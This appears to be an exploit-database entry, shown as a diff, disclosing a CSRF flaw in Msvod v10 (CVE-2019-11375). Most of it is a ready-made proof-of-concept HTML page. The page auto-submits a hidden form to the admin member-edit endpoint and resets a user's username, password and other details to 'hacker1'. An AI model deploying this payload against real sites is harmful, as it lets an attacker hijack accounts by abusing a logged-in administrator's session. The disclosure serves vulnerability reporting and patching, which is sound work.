@@ -1,0 +1,68 @@
+# Exploit Title: Msvod v10 has a CSRF vulnerability to change user information
+
+# Date: 2019-04-14
+# Exploit Author: ax8
+# Vendor Homepage: https://github.com/Li-Siyuan
+# Software Link: https://www.msvodx.com/
+# Version: v10
+# CVE : CVE-2019-11375
+
+ 
+
+Msvod v10 has a CSRF vulnerability to change user information via the admin/member/edit.html URI.
+
+ 
+
+<!--poc.html(change user infomation)-->
+
+<!DOCTYPE html>
+
+<html>
+
+  <head>
+
+  <title> CSRF Proof</title>
+
+  <script type="text/javascript">
+
+    function exec1(){
+
+      document.getElementById('form1').submit();
+
+    }
+
+  </script>
+
+  </head>
+
+  <body onload="exec1();">
+
+    <form id="form1" action="http://a.msvodx.cn/admin/member/edit.html" method="POST">
+
+      <input type="hidden" name="username" value="hacker1" />
+
+  <input type="hidden" name="nickname" value="hacker1" />
+
+  <input type="hidden" name="email" value="hacker1" />
+
+  <input type="hidden" name="tel" value="hacker1" />
+
+      <input type="hidden" name="password" value="hacker1" />
+
+      <input type="hidden" name="out_time" value="1970-01-01" />  
+
+  <input type="hidden" name="money" value="30" />
+
+  <input type="hidden" name="is_permanent" value="0" />
+
+  <input type="hidden" name="status" value="1" />
+
+  <input type="hidden" name="id" value="821" />
+
+    </form>
+
+  </body>
+
+</html>
+
+MISC:http://www.iwantacve.cn/index.php/archives/198/
